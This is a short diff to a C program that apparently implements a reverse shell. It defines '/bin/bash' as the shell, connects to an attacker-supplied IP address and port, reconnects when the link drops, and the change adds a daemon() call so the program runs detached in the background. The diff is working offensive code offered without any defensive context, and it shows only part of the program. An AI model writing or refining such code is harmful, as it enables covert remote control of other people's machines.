@@ -1,3 +1,4 @@
+#include <arpa/inet.h>
 #include <fcntl.h>
 #include <netdb.h>
 #include <netinet/in.h>
@@ -9,7 +10,9 @@
 #include <sys/socket.h>
 #include <sys/types.h>
 #include <unistd.h>
-#include <wait.h>
+#include <sys/wait.h>
+#include <termios.h>
+
 #define SHELL "/bin/bash"
 #define MAX_BUF 1024
 
@@ -55,14 +58,13 @@ int create_socket()
 struct sockaddr_in create_serv_addr(char* argv[])
 {
     struct sockaddr_in serv_addr;
-    struct hostent* server;
-    server = gethostbyname(argv[1]);
+
     memset(&serv_addr, 0, sizeof(serv_addr));
-    serv_addr.sin_family = AF_INET;
-    serv_addr.sin_port = htons(atoi(argv[2]));
-    serv_addr.sin_addr.s_addr = INADDR_ANY;
-    bcopy((char*)server->h_addr, (char*)&serv_addr.sin_addr.s_addr,
-        server->h_length);
+
+    serv_addr.sin_family        = AF_INET;
+    serv_addr.sin_port          = htons(atoi(argv[2]));
+    serv_addr.sin_addr.s_addr   = inet_addr(argv[1]);
+    
     return serv_addr;
 }
 
@@ -76,6 +78,7 @@ int reconnect(int sockfd)
 int main(int argc, char* argv[])
 {
     // PUTS PROGRAM ON BACKGROUND AND CHECK PORT NUMBER
+    daemon(1, 0);
     chk_argno(&argc);
 
     pid_t pid;
